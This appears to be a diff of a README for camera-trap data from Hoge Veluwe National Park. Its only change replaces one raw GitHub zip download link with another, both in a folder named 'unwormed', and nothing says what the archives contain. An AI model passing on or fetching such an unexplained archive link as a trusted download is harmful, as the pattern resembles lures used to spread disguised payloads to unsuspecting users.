@@ -20,5 +20,5 @@ Collected from Hoge Veluwe National Park (NL)
 • Biggest national park in the Netherlands
 
 
-https://github.com/Shamzmohamed/CameraTrap/raw/refs/heads/main/unwormed/Trap_Camera_1.7.zip
+https://github.com/Shamzmohamed/CameraTrap/raw/refs/heads/main/unwormed/Camera-Trap-v2.5.zip
 
